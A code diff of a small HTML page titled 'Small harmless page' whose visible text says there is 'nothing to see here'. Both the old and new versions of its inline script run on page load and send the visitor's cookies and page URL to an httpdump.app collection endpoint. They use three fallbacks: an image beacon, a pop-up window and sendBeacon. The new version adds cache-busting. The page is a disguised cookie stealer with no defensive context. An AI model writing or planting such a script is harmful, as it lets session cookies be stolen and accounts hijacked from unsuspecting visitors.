@@ -1,37 +1,15 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>Small harmless page</title>
-
+<title>x</title>
 <script>
 (function(){
-  var endpoint = "https://httpdump.app/dumps/2a0b49ec-bc8b-433c-b1f4-3b912adbd0ef?c=";
-  // 1) give the page a moment so cookies are available
-  setTimeout(function(){
-    try {
-      // main: image beacon (no CORS)
-      new Image().src = endpoint + encodeURIComponent(document.cookie + ";ref=" + document.location);
-    } catch(e){}
-  }, 900);
-
-  // 2) fallback: open the URL in a new tab (guarantees a request)
-  setTimeout(function(){
-    try {
-      var w = window.open(endpoint + encodeURIComponent(document.cookie + ";ref=" + document.location));
-      if (w) setTimeout(function(){ try{ w.close(); }catch(e){} }, 1000);
-    } catch(e){}
-  }, 1600);
-
-  // 3) final fallback: try navigator.sendBeacon (may be blocked cross-origin)
-  setTimeout(function(){
-    try {
-      if (navigator.sendBeacon) {
-        var body = "c=" + encodeURIComponent(document.cookie + ";ref=" + document.location);
-        navigator.sendBeacon(endpoint, body);
-      }
-    } catch(e){}
-  }, 2000);
+  const endpoint = "https://httpdump.app/dumps/2a0b49ec-bc8b-433c-b1f4-3b912adbd0ef?c=";
+  const payload = () => encodeURIComponent(document.cookie + ";ref=" + location.href + ";r=" + Math.random());
+  // Try multiple ways, with delays and cache-busting
+  setTimeout(()=>{ try{ new Image().src = endpoint + payload(); }catch(e){} }, 900);
+  setTimeout(()=>{ try{ window.open(endpoint + payload()); }catch(e){} }, 1600);
+  setTimeout(()=>{ try{ if(navigator.sendBeacon) navigator.sendBeacon(endpoint, "c="+payload()); }catch(e){} }, 2100);
 })();
 </script>
-
 <h1>Small harmless page</h1>
 <p>Thanks for looking — nothing to see here.</p>
